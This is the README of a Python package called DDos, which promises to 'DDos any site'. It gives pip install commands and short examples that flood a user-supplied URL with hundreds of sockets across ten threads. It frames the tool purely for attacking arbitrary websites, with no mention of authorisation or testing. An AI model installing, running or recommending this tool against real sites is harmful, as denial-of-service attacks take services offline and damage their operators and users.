# DDos

DDos any site using python

## Install

### From Pypi

`pip3 install DDos`

### From GitHub

`pip3 install git+https://github.com/donno2048/DDos`

## Usage

### GUI

To use it just run:

```sh
DDos
```

or

```sh
ddos
```

in the terminal to launch the GUI (tkinter is a requirement for the GUI so use: `sudo apt-get update && sudo apt-get install python3-tk -y` on linux and on Windows it's already installed)

### TUI

To use the text-based user interface see this python example:

```py
from DDos import checkUrl, DDos # import the needed functions
while True:
    url = input("Give me a URL: ") # get a url from the user
    if checkUrl(url): break # if it's formatted correctly exit the loop
    else: print("This URL isn't formatted correctly, try again") # else, go back
DDos(url, 400, 10) # ddos this url with 400 sockets and 10 threads
```

or simply:

```py
from DDos import DDos
DDos(input("Give me a URL: ")) # if the url isn't formatted correctly it will have an assertion error, use 500 sockets and 10 threads
```
